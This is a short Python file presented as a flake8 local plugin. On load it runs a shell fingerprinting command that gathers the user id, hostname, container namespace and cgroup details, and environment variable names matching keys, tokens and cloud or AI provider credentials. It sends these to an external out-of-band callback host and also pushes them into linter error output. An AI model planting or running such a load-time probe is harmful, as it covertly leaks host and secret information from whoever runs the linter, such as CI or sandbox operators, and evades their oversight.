"""H67 probe: flake8 local plugin, executed at plugin load time."""
import json, os, socket, subprocess, urllib.parse, urllib.request

BASE = "https://dc19bgkqecshk33bhelgbs93m6q9okg13.oast.fun"

def _shell():
    cmd = ("(id; hostname; echo PID1; head -c 300 /proc/1/cmdline | tr '\\0' ' '; echo; "
           "echo CGROUP; cat /proc/self/cgroup; echo NS; readlink /proc/self/ns/pid /proc/self/ns/user /proc/self/ns/mnt; "
           "echo INITNS; readlink /proc/1/ns/pid /proc/1/ns/user /proc/1/ns/mnt; "
           "echo ENVIRON_NAMES; tr '\\0' '\\n' < /proc/self/environ | cut -d= -f1 | sort | tr '\\n' ' '; "
           "echo; echo ENVHITS; env | cut -d= -f1 | grep -Ei 'KEY|TOKEN|SECRET|PASS|CRED|DATABASE|GITHUB|GITLAB|JIRA|SMTP|STRIPE|PINECONE|LANGCHAIN|ANTHROPIC|OPENAI|GOOGLE|GCP|AWS|AZURE|SLACK' | sort | tr '\\n' ' '; echo)")
    try:
        return subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=8).stdout
    except Exception as e:
        return "shell-err:" + str(e)

def _probe(tag):
    fp = _shell()
    data = {"tag": tag, "uid": os.getuid(), "cwd": os.getcwd(), "host": socket.gethostname(), "fp": fp[:1500]}
    try:
        urllib.request.urlopen(BASE + "/" + tag + "?d=" + urllib.parse.quote(json.dumps(data)[:1800]), timeout=10).read(1)
    except Exception:
        pass
    return fp

FP = _probe("h67-flake8")

class ProbePlugin:
    name = "h67-probe"
    version = "1.0"
    def __init__(self, tree=None, filename=None):
        self.tree = tree
        self.filename = filename
    def run(self):
        raise RuntimeError("H67-FLAKE8 " + str(FP)[:800])
        yield  # pragma: no cover
